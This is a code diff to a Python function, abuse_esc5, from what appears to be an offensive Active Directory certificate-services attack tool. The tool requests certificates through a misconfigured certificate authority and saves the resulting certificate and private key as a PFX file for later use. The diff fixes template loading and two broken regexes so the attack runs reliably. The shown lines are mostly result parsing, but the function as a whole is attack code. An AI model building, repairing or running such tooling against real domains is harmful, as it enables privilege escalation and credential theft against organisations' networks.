@@ -15,7 +15,8 @@ def abuse_esc5(session):
     ca = cas[0]
     ca_name = ca['name']
 
-    templates = ca.get("templates") or load_json_loot(session, template_fallback=True)
+    # 🔥 FIX: Load templates from top-level session metadata (not CA)
+    templates = session.adcs_metadata.get("templates") or load_json_loot(session, template_fallback=True)
     if not templates:
         print(red("[-] No templates available. Run 'adcs enum' first."))
         return
@@ -68,7 +69,7 @@ def abuse_esc5(session):
     print(out)
     if err: print(red(err))
 
-    req_id_match = re.search(r"Request ID is (\\d+)", out)
+    req_id_match = re.search(r"Request ID is (\d+)", out)
     if not req_id_match:
         print(red("[-] Could not extract Request ID."))
         return
@@ -88,7 +89,7 @@ def abuse_esc5(session):
     if err: print(red(err))
 
     # Attempt to extract and save PFX
-    pfx_match = re.search(r"Saving certificate and private key to '([^']+\\.pfx)'", out)
+    pfx_match = re.search(r"Saving certificate and private key to '([^']+\.pfx)'", out)
     if pfx_match:
         pfx_file = pfx_match.group(1)
         if os.path.exists(pfx_file):
